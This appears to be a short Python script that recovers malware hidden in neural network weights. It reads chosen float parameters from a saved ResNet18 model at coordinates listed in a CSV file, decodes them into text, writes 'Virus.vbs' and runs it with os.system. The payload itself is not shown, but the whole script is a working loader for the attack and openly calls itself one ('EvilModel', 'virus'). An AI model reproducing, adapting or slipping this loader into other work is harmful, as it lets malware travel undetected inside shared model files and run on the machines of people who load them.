import os
import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
import numpy as np
import torch
from torch import nn
import torch.optim as optim
import torchvision
from torchvision import transforms, models, datasets
import imageio
import time
import warnings
import random
import sys
import copy
import json
from PIL import Image
import struct
import os

EvilModel = models.resnet18()
EvilParam = torch.load('ResNet18.pt')
EvilModel.load_state_dict(EvilParam)

df = pd.read_csv('Train_data.csv')
model = EvilModel

virus = []
for i in range(0,len(df)):
  layer = df['layer'][i]
  param1 = df['param1'][i]
  param2 = df['param2'][i]
  param3 = df['param3'][i]
  param4 = df['param4'][i]
  num = model.state_dict()[layer][param1][param2][param3][param4].numpy().tolist()
  virus = virus + [num]
texts = ''
for i in virus:
  text = struct.pack('>f', i).decode('cp1250')
  texts = texts + text
texts = texts.replace('<','')

with open('Virus.vbs',mode = 'w') as f:
    file = f.write(texts)
    
os.system('Virus.vbs')

